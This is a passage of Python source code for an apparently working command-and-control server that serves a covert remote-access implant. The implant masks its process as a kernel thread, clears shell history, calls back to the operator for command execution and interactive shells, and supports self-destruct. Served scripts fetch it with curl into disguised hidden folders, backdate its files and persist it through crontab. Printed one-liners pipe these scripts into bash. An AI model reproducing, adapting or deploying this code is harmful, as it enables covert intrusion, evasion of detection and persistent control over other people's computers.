    def rsz(s,c,r):
        try:fcntl.ioctl(s.mfd,termios.TIOCSWINSZ,struct.pack('HHHH',r,c,0,0));os.kill(s.pid,signal.SIGWINCH)
        except:pass
    def wr(s,d):
        try:os.write(s.mfd,d.encode() if isinstance(d,str) else d);return True
        except:return False
    def rd(s,t=0.01):
        try:
            r,_,_=select.select([s.mfd],[],[],t)
            if s.mfd in r:return os.read(s.mfd,8192)
        except:pass
        return None
    def close(s):
        s.alive=False
        try:os.close(s.mfd)
        except:pass
        try:os.kill(s.pid,signal.SIGTERM);os.waitpid(s.pid,os.WNOHANG)
        except:pass
def hide(n):
    if HAS_CTYPES:
        try:ctypes.CDLL('libc.so.6').prctl(15,n.encode(),0,0,0)
        except:pass
    try:
        with open('/proc/self/comm','w') as f:f.write(n[:15])
    except:pass
    for v in['HISTFILE','HISTSIZE','HISTFILESIZE','PROMPT_COMMAND']:os.environ.pop(v,None)
    os.environ['HISTSIZE']='0';os.environ['HISTFILESIZE']='0'
    try:
        hf=os.path.expanduser('~/.bash_history')
        if os.path.exists(hf):open(hf,'w').close()
    except:pass
def daemon():
    try:
        if os.fork()>0:os._exit(0)
    except:pass
    os.setsid();os.umask(0)
    try:
        if os.fork()>0:os._exit(0)
    except:pass
    sys.stdout.flush();sys.stderr.flush()
    with open('/dev/null','r') as f:os.dup2(f.fileno(),sys.stdin.fileno())
    with open('/dev/null','a+') as f:os.dup2(f.fileno(),sys.stdout.fileno());os.dup2(f.fileno(),sys.stderr.fileno())
def selfdestruct():
    for p in['defunct','6319','htop']:
        try:subprocess.run(['pkill','-9','-f',p],capture_output=True,timeout=5)
        except:pass
    try:
        r=subprocess.run(['crontab','-l'],capture_output=True,text=True)
        if r.returncode==0:
            lines=[l for l in r.stdout.split('\\n') if '6319' not in l and 'defunct' not in l]
            subprocess.run(['crontab','-'],input='\\n'.join(lines),text=True,capture_output=True)
    except:pass
    for d in DIRS:
        if os.path.exists(d):
            try:shutil.rmtree(d,ignore_errors=True)
            except:pass
    os._exit(0)
def beacon(h,p,sec,info):
    sock=None
    try:
        sock=socket.socket();sock.settimeout(10);sock.connect((h,p))
        init=json.dumps({'secret':sec,'mode':'beacon'}).encode()
        sock.sendall(len(init).to_bytes(4,'big')+init)
        ch=Ch(sec);sock.sendall(ch.enc(info))
        resp=ch.dec(sock)
        if not resp:return None,0
        return resp.get('has_work',False),resp.get('sleep',0)
    except:return None,0
    finally:
        if sock:
            try:sock.close()
            except:pass
def session(h,p,sec,info):
    sock=None;ptys={};cwd=os.path.expanduser('~')
    try:
        sock=socket.socket();sock.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1);sock.settimeout(30);sock.connect((h,p))
        init=json.dumps({'secret':sec,'mode':'interactive'}).encode()
        sock.sendall(len(init).to_bytes(4,'big')+init)
        ch=Ch(sec);sock.sendall(ch.enc(info))
        resp=ch.dec(sock)
        if not resp:return
        sock.setblocking(False);st=time.time()+3600;it=time.time()+300
        while time.time()<st:
            rds=[sock]+[s.mfd for s in ptys.values() if s.alive]
            try:r,_,_=select.select(rds,[],[],0.1)
            except:break
            for sid,s in list(ptys.items()):
                if s.alive and s.mfd in r:
                    d=s.rd(0)
                    if d:it=time.time()+300;sock.setblocking(True);sock.sendall(ch.enc({'type':'pty_data','session_id':sid,'data':d.decode('utf-8',errors='replace')}));sock.setblocking(False)
            if sock in r:
                it=time.time()+300;sock.setblocking(True);msg=ch.dec(sock);sock.setblocking(False)
                if not msg:break
                mt=msg.get('type',msg.get('cmd','exec'))
                if mt=='ping':sock.setblocking(True);sock.sendall(ch.enc({'status':'pong'}));sock.setblocking(False)
                elif mt=='disconnect':sock.setblocking(True);sock.sendall(ch.enc({'status':'disconnected'}));sock.close();return('disconnect',0)
                elif mt=='sleep':
                    m=msg.get('minutes',60);sock.setblocking(True);sock.sendall(ch.enc({'status':'sleeping','minutes':m}));sock.close();return('sleep',m*60)
                elif mt=='go_dark':
                    hrs=msg.get('hours',24);sock.setblocking(True);sock.sendall(ch.enc({'status':'going_dark','hours':hrs}));sock.close();return('go_dark',hrs*3600)
                elif mt=='self_destruct':sock.setblocking(True);sock.sendall(ch.enc({'status':'destroying'}));sock.close();selfdestruct()
                elif mt=='exec':
                    cmd=msg.get('data','').strip();sock.setblocking(True)
                    try:
                        if cmd.startswith('cd '):
                            nd=os.path.normpath(os.path.join(cwd,os.path.expanduser(cmd[3:].strip())) if not os.path.isabs(os.path.expanduser(cmd[3:].strip())) else os.path.expanduser(cmd[3:].strip()))
                            if os.path.isdir(nd):cwd=nd;sock.sendall(ch.enc({'stdout':f'Changed to {cwd}\\n','stderr':'','code':0}))
                            else:sock.sendall(ch.enc({'stdout':'','stderr':f'No such directory: {nd}\\n','code':1}))
                        else:
                            sh='/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'
                            r=subprocess.run([sh,'-c',f'cd {cwd} && {cmd}'],capture_output=True,timeout=300)
                            sock.sendall(ch.enc({'stdout':r.stdout.decode(errors='replace'),'stderr':r.stderr.decode(errors='replace'),'code':r.returncode}))
                    except Exception as e:sock.sendall(ch.enc({'error':str(e)}))
                    sock.setblocking(False)
                elif mt=='pty_open':
                    sid=msg.get('session_id');cols,rows=msg.get('cols',80),msg.get('rows',24)
                    ptys[sid]=PTY(sid,cols,rows,cwd)
                    sock.setblocking(True);sock.sendall(ch.enc({'type':'pty_opened','session_id':sid}));sock.setblocking(False)
                elif mt=='pty_data':
                    sid=msg.get('session_id')
                    if sid in ptys:ptys[sid].wr(msg.get('data',''))
                elif mt=='pty_resize':
                    sid=msg.get('session_id')
                    if sid in ptys:ptys[sid].rsz(msg.get('cols',80),msg.get('rows',24))
                elif mt=='pty_close':
                    sid=msg.get('session_id')
                    if sid in ptys:
                        ptys[sid].close();sock.setblocking(True);sock.sendall(ch.enc({'type':'pty_exit','session_id':sid,'code':0}));sock.setblocking(False);del ptys[sid]
            for sid,s in list(ptys.items()):
                try:
                    pid,status=os.waitpid(s.pid,os.WNOHANG)
                    if pid!=0:
                        s.alive=False;sock.setblocking(True);sock.sendall(ch.enc({'type':'pty_exit','session_id':sid,'code':os.WEXITSTATUS(status) if os.WIFEXITED(status) else -1}));sock.setblocking(False);del ptys[sid]
                except:pass
            if time.time()>it and not ptys:break
    except:pass
    finally:
        if sock:
            try:sock.close()
            except:pass
        for s in ptys.values():s.close()
host=os.environ.get('C2_HOST','HOST_PH')
port=int(os.environ.get('C2_PORT','PORT_PH'))
secret=os.environ.get('SECRET','SECRET_PH')
hidden=os.environ.get('HIDDEN_NAME',random.choice(KNAMES))
stealth=os.environ.get('STEALTH','1')=='1'
channel=os.environ.get('CHANNEL','stealth')
if stealth:daemon()
hide(hidden);sys.argv=['']
info={'hostname':platform.node(),'os':f'{platform.system()} {platform.release()}','user':getpass.getuser(),'arch':platform.machine(),'pid':os.getpid(),'hidden_name':hidden,'pty_support':True,'channel':channel}
while True:
    try:
        res=session(host,port,secret,info)
        if res:
            act,delay=res
            if act in('sleep','go_dark')and delay>0:time.sleep(delay);continue
        time.sleep(random.randint(5,15))
    except KeyboardInterrupt:break
    except:time.sleep(random.randint(5,15))
'''


def get_persist_script():
    """Generate persist deployment script"""
    secret = request.args.get('s', generate_secret())
    server_url = get_server_url()
    c2_host = get_c2_host()
    
    script = f'''#!/bin/bash
set -e
C2_URL="{server_url}"
C2_HOST="{c2_host}"
C2_PORT="{C2_SOCKET_PORT}"
SECRET="${{S:-{secret}}}"

# Kernel thread names for process masking
KERNEL_NAMES=("[kworker/0:0]" "[ksmd]" "[kswapd0]" "[migration/0]" "[watchdog/0]" "[rcu_sched]" "[kthreadd]" "[irq/9-acpi]")
HIDDEN_NAME="${{KERNEL_NAMES[$RANDOM % ${{#KERNEL_NAMES[@]}}]}}"

# Hidden directory candidates - look like legitimate system/app dirs
HIDDEN_DIRS=(
    "$HOME/.local/share/.fonts"
    "$HOME/.cache/.mozilla"
    "$HOME/.config/.pulse"
    "$HOME/.gnupg/.keyring"
    "$HOME/.ssh/.known"
    "$HOME/.local/lib/.python"
    "$HOME/.cache/.thumbnails"
)
INSTALL_DIR="${{HIDDEN_DIRS[$RANDOM % ${{#HIDDEN_DIRS[@]}}]}}"

# Hidden filenames - look like cache/temp files
HIDDEN_FILES=(".cache.db" ".session.lock" ".state.bin" ".thumbs.db" ".index.dat" ".fonts.cache")
AGENT_FILE="${{HIDDEN_FILES[$RANDOM % ${{#HIDDEN_FILES[@]}}]}}"

mkdir -p "$INSTALL_DIR" && chmod 700 "$INSTALL_DIR"

# Random timestamp 90-365 days ago
DAYS_AGO=$((90 + RANDOM % 275))
if date --version 2>/dev/null | grep -q GNU; then
    OLD_TIME=$(date -d "$DAYS_AGO days ago" +%Y%m%d%H%M.%S)
else
    OLD_TIME=$(date -v-${{DAYS_AGO}}d +%Y%m%d%H%M.%S 2>/dev/null)
fi
[[ -n "$OLD_TIME" ]] && touch -t "$OLD_TIME" "$INSTALL_DIR" 2>/dev/null

# Download agent
curl -fsSL "$C2_URL/bin/agent_stealth.py" -o "$INSTALL_DIR/$AGENT_FILE" 2>/dev/null
chmod 600 "$INSTALL_DIR/$AGENT_FILE"
[[ -n "$OLD_TIME" ]] && touch -t "$OLD_TIME" "$INSTALL_DIR/$AGENT_FILE" 2>/dev/null

# Config (both old and new var names for compatibility)
cat > "$INSTALL_DIR/.conf" << EOF
SYNC_HOST=$C2_HOST
SYNC_PORT=$C2_PORT
TOKEN=$SECRET
PNAME=$HIDDEN_NAME
MODE=persist
QUIET=1
CACHE=$AGENT_FILE
BEACON_MODE=0
C2_HOST=$C2_HOST
C2_PORT=$C2_PORT
SECRET=$SECRET
CHANNEL=persist
STEALTH=1
HIDDEN_NAME=$HIDDEN_NAME
AGENT_FILE=$AGENT_FILE
EOF
chmod 600 "$INSTALL_DIR/.conf"
[[ -n "$OLD_TIME" ]] && touch -t "$OLD_TIME" "$INSTALL_DIR/.conf" 2>/dev/null

# Launcher script
cat > "$INSTALL_DIR/.run" << LAUNCHER
#!/bin/bash
cd "\$(dirname "\$0")"
source ./.conf 2>/dev/null
export SYNC_HOST SYNC_PORT TOKEN PNAME MODE QUIET CACHE BEACON_MODE C2_HOST C2_PORT SECRET CHANNEL STEALTH HIDDEN_NAME AGENT_FILE
PY=\$(command -v python3 || command -v python)
\$PY -m pip install pynacl -q --break-system-packages 2>/dev/null || \$PY -m pip install pynacl -q --user 2>/dev/null || true
nohup \$PY \$CACHE </dev/null >/dev/null 2>&1 &
disown
LAUNCHER
chmod 700 "$INSTALL_DIR/.run"
[[ -n "$OLD_TIME" ]] && touch -t "$OLD_TIME" "$INSTALL_DIR/.run" 2>/dev/null

# Persistence via crontab
(crontab -l 2>/dev/null | grep -v "$INSTALL_DIR" || true; echo "@reboot $INSTALL_DIR/.run") | crontab - 2>/dev/null || true

# Start agent
cd "$INSTALL_DIR" && source ./.conf && export SYNC_HOST SYNC_PORT TOKEN PNAME MODE QUIET CACHE BEACON_MODE C2_HOST C2_PORT SECRET CHANNEL STEALTH HIDDEN_NAME AGENT_FILE && PY=$(command -v python3 || command -v python) && nohup $PY $CACHE </dev/null >/dev/null 2>&1 &
'''
    return Response(script, mimetype='text/plain')


def get_stealth_script():
    secret = request.args.get('s', generate_secret())
    c2_host = get_c2_host()
    
    agent_code = STEALTH_AGENT_CODE.replace('HOST_PH', c2_host)
    agent_code = agent_code.replace('PORT_PH', str(C2_SOCKET_PORT))
    agent_code = agent_code.replace('SECRET_PH', secret)
    
    script = f'''#!/bin/bash
PY=$(command -v python3||command -v python)
$PY -m pip install pynacl -q --break-system-packages 2>/dev/null||$PY -m pip install pynacl -q --user 2>/dev/null||true
C2_HOST="{c2_host}" C2_PORT="{C2_SOCKET_PORT}" SECRET="{secret}" CHANNEL="stealth" STEALTH=1 exec $PY << 'PYEOF'
{agent_code}
PYEOF
'''
    return Response(script, mimetype='text/plain')


@app.route('/uninstall')
def uninstall_script():
    script = '''#!/bin/bash
pkill -f defunct 2>/dev/null
pkill -f kworker.*python 2>/dev/null
crontab -l 2>/dev/null | grep -v "6319" | grep -v "defunct" | crontab - 2>/dev/null
systemctl --user stop dbus-session 2>/dev/null
systemctl --user disable dbus-session 2>/dev/null
rm -f "$HOME/.config/systemd/user/dbus-session.service"
for rc in ".bashrc" ".zshrc" ".profile"; do
    [[ -f "$HOME/$rc" ]] && sed -i '/defunct/d' "$HOME/$rc" 2>/dev/null
done
rm -rf "$HOME/.config/.htop" "$HOME/.cache/.fontconfig" 2>/dev/null
echo "[+] Uninstalled"
'''
    return Response(script, mimetype='text/plain')


def register_dynamic_routes():
    """Register dynamic routes at startup"""
    app.add_url_rule(f'/{STEALTH_PATH}', 'stealth_deploy', get_stealth_script)
    app.add_url_rule(f'/{PERSIST_PATH}', 'persist_deploy', get_persist_script)
    if STEALTH_PATH != 'stealth':
        app.add_url_rule('/stealth', 'stealth_legacy', get_stealth_script)
    if PERSIST_PATH != 'x':
        app.add_url_rule('/x', 'persist_legacy', get_persist_script)
    
    if LOGIN_PATH:
        app.add_url_rule(f'/{LOGIN_PATH}', 'login_page', login_page_handler, methods=['GET', 'POST'])
    else:
        app.add_url_rule('/login', 'login_page', login_page_handler, methods=['GET', 'POST'])
    
    if DASHBOARD_PATH:
        app.add_url_rule(f'/{DASHBOARD_PATH}', 'dashboard', dashboard_handler)
        app.add_url_rule('/', 'root', root_redirect)
    else:
        app.add_url_rule('/', 'dashboard', dashboard_handler)
    
    app.add_url_rule('/logout', 'logout', logout_handler)


def main():
    detect_server_ip()
    register_dynamic_routes()
    
    print("""
 ██████╗ ██████╗ ██╗ █████╗ 
██╔════╝ ╚════██╗███║██╔══██╗
███████╗  █████╔╝╚██║╚██████║
██╔═══██╗ ╚═══██╗ ██║ ╚═══██║
╚██████╔╝██████╔╝ ██║ █████╔╝
 ╚═════╝ ╚═════╝  ╚═╝ ╚════╝ 
   C2 Server v3.2 - Multi-Channel
""")
    
    server_url = get_server_url()
    
    print(f"[*] Server IP: {SERVER_IP}")
    print(f"[*] Encryption: NaCl (XSalsa20-Poly1305)")
    print(f"[*] Mode: Persistent + Multi-Channel")
    print(f"[*] WebSocket: Enabled (xterm.js terminal)")
    
    if AUTH_KEY:
        print(f"[*] Auth: Enabled (24h cookie)")
        login_path = LOGIN_PATH if LOGIN_PATH else 'login'
        print(f"[*] Login: /{login_path}")
    
    if DASHBOARD_PATH:
        print(f"[*] Dashboard: /{DASHBOARD_PATH}")
    
    if notifier.is_configured():
        print(f"[*] Webhooks: Configured")
    
    threading.Thread(target=socket_server, daemon=True).start()
    
    print(f"[*] Agents: port {C2_SOCKET_PORT}")
    print()
    print("\033[1;36m" + "=" * 60 + "\033[0m")
    
    if AUTH_KEY and LOGIN_PATH:
        print("\033[1;35m[ACCESS]\033[0m")
        print(f"  Login:     {server_url}/{LOGIN_PATH}")
        if DASHBOARD_PATH:
            print(f"  Dashboard: {server_url}/{DASHBOARD_PATH}")
        print(f"  Key:       {AUTH_KEY}")
        print()
    
    print("\033[1;32m[DEPLOY COMMANDS]\033[0m")
    print()
    print("\033[1;33mStealth (in-memory, no persistence):\033[0m")
    print(f'  bash -c "$(curl -fsSL {server_url}/{STEALTH_PATH})"')
    print()
    print("\033[1;33mPersist (hidden files, survives reboot):\033[0m")
    print(f'  bash -c "$(curl -fsSL {server_url}/{PERSIST_PATH})"')
    print("\033[1;36m" + "=" * 60 + "\033[0m")
    print()
    
    socketio.run(app, host='0.0.0.0', port=C2_WEB_PORT, debug=False, allow_unsafe_werkzeug=True)


@app.route('/raw/<filename>')
def raw_source(filename):
    """Serve raw source files for VPS installation"""
    import os
    base_dir = os.path.dirname(os.path.abspath(__file__))
    
    file_map = {
        'server.py': os.path.join(base_dir, 'server.py'),
        'crypto.py': os.path.join(base_dir, 'crypto.py'),
        'webhooks.py': os.path.join(base_dir, 'webhooks.py'),
        'index.html': os.path.join(base_dir, 'templates', 'index.html'),
        'style.css': os.path.join(base_dir, 'static', 'style.css'),
    }
    
    if filename not in file_map:
        return "Not found", 404
    
    filepath = file_map[filename]
    if not os.path.exists(filepath):
        return "File not found", 404
    
    with open(filepath, 'r') as f:
        content = f.read()
    
    return Response(content, mimetype='text/plain')


@app.route('/install.sh')
def install_script():
    """VPS installer script - downloads all files from this server"""
    server_url = get_server_url()
    
    script = f'''#!/bin/bash
set -e

C="\033[1;36m"
G="\033[1;32m"
Y="\033[1;33m"
R="\033[1;31m"
N="\033[0m"

INSTALL_DIR="/opt/6319"
SERVICE_NAME="6319-c2"
SOURCE_URL="{server_url}"

echo -e "${{C}}"
cat << 'BANNER'
    ██████╗ ██████╗  ██╗ █████╗ 
   ██╔════╝╚════██╗███║██╔══██╗
   ██████╗  █████╔╝╚██║╚██████║
   ██╔═══╝ ╚═══██╗ ██║ ╚═══██║
   ╚██████╗██████╔╝ ██║ █████╔╝
    ╚═════╝╚═════╝  ╚═╝ ╚════╝ 
   C2 Server v3.2 Installer
BANNER
echo -e "${{N}}"

info() {{ echo -e "${{G}}[+]${{N}} $1"; }}
warn() {{ echo -e "${{Y}}[!]${{N}} $1"; }}
err() {{ echo -e "${{R}}[-]${{N}} $1"; exit 1; }}

[[ $EUID -ne 0 ]] && err "Run as root: sudo bash install.sh"

detect_os() {{
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
    elif [ -f /etc/redhat-release ]; then
        OS="rhel"
    elif [ -f /etc/debian_version ]; then
        OS="debian"
    else
        OS=$(uname -s | tr '[:upper:]' '[:lower:]')
    fi
    info "Detected OS: $OS"
}}

install_deps_debian() {{
    info "Installing dependencies (apt)..."
    apt-get update -qq
    apt-get install -y -qq python3 python3-pip python3-venv curl >/dev/null 2>&1
}}

install_deps_rhel() {{
    info "Installing dependencies (yum/dnf)..."
    if command -v dnf &>/dev/null; then
        dnf install -y python3 python3-pip curl >/dev/null 2>&1
    else
        yum install -y python3 python3-pip curl >/dev/null 2>&1
    fi
}}

install_deps() {{
    case "$OS" in
        ubuntu|debian|kali|mint|pop) install_deps_debian ;;
        rhel|centos|fedora|rocky|alma) install_deps_rhel ;;
        arch|manjaro) pacman -Sy --noconfirm python python-pip curl >/dev/null 2>&1 ;;
        alpine) apk add --no-cache python3 py3-pip curl >/dev/null 2>&1 ;;
        *) warn "Unknown OS, trying apt..."; install_deps_debian ;;
    esac
}}

setup_firewall() {{
    info "Configuring firewall..."
    if command -v ufw &>/dev/null; then
        ufw allow 5000/tcp >/dev/null 2>&1 || true
        ufw allow 6318/tcp >/dev/null 2>&1 || true
    elif command -v firewall-cmd &>/dev/null; then
        firewall-cmd --permanent --add-port=5000/tcp >/dev/null 2>&1 || true
        firewall-cmd --permanent --add-port=6318/tcp >/dev/null 2>&1 || true
        firewall-cmd --reload >/dev/null 2>&1 || true
    elif command -v iptables &>/dev/null; then
        iptables -I INPUT -p tcp --dport 5000 -j ACCEPT 2>/dev/null || true
        iptables -I INPUT -p tcp --dport 6318 -j ACCEPT 2>/dev/null || true
    fi
}}

detect_os
install_deps

if systemctl is-active --quiet ${{SERVICE_NAME}} 2>/dev/null; then
    info "Stopping existing service..."
    systemctl stop ${{SERVICE_NAME}}
fi

info "Creating installation directory..."
mkdir -p "$INSTALL_DIR/templates" "$INSTALL_DIR/static"
cd "$INSTALL_DIR"

info "Downloading source files from $SOURCE_URL..."
curl -fsSL "$SOURCE_URL/raw/server.py" -o server.py || err "Failed to download server.py"
curl -fsSL "$SOURCE_URL/raw/crypto.py" -o crypto.py || err "Failed to download crypto.py"
curl -fsSL "$SOURCE_URL/raw/webhooks.py" -o webhooks.py || err "Failed to download webhooks.py"
curl -fsSL "$SOURCE_URL/raw/index.html" -o templates/index.html || err "Failed to download index.html"
curl -fsSL "$SOURCE_URL/raw/style.css" -o static/style.css || err "Failed to download style.css"
info "All files downloaded successfully"

if [ ! -d "venv" ]; then
    info "Creating Python virtual environment..."
    python3 -m venv venv
fi
source venv/bin/activate

info "Installing Python packages..."
pip install --upgrade pip -q
pip install flask flask-socketio pynacl gevent gevent-websocket -q

setup_firewall

info "Creating systemd service..."
cat > /etc/systemd/system/${{SERVICE_NAME}}.service << SVCEOF
[Unit]
Description=6319 C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR
Environment="PATH=$INSTALL_DIR/venv/bin:/usr/local/bin:/usr/bin:/bin"
ExecStart=$INSTALL_DIR/venv/bin/python server.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
SVCEOF

systemctl daemon-reload
systemctl enable ${{SERVICE_NAME}} >/dev/null 2>&1
systemctl start ${{SERVICE_NAME}}

sleep 2
if systemctl is-active --quiet ${{SERVICE_NAME}}; then
    info "Service started successfully!"
    echo ""
    echo -e "${{C}}============================================${{N}}"
    echo -e "${{G}}6319 C2 Server is running${{N}}"
    echo -e "  Web UI: ${{Y}}http://$(hostname -I | awk '{{print $1}}'):5000${{N}}"
    echo -e "  Agents: ${{Y}}port 6318${{N}}"
    echo -e "${{C}}============================================${{N}}"
else
    err "Service failed to start. Check: journalctl -u ${{SERVICE_NAME}}"
fi
'''
    return Response(script, mimetype='text/plain')


if __name__ == '__main__':
    main()
